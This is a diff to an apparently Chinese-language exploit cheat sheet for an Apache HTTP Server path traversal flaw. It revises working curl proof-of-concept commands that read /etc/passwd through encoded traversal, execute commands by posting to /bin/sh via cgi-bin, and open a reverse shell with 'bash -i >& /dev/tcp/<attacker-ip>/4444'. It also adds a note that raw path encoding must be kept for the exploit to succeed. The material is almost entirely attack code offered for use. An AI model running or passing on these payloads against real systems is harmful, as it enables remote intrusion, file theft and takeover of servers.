@@ -163,14 +163,16 @@ curl -X POST http://<target-ip>:8888/druid/indexer/v1/sampler \
 
 ```bash
 # 文件读取
-curl --path-as-is http://<target-ip>:8080/icons/.%2e/%2e%2e/%2e%2e/etc/passwd
+curl --path-as-is http://<target-ip>:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 # 命令执行（需要 CGI 启用）
-curl --data "echo;id" 'http://<target-ip>:8080/cgi-bin/.%2e/.%2e/.%2e/bin/sh'
+curl --path-as-is --data "echo;id" 'http://<target-ip>:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
 
 # 反弹 Shell
-curl --data "echo;bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" \
-  'http://<target-ip>:8080/cgi-bin/.%2e/.%2e/.%2e/bin/sh'
+curl --path-as-is --data "echo;bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" \
+  'http://<target-ip>:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+
+# 实现注意：客户端必须保留原始路径编码（等价 curl --path-as-is），否则可能被自动规范化导致 PoC 失败
 ```
 
 ---
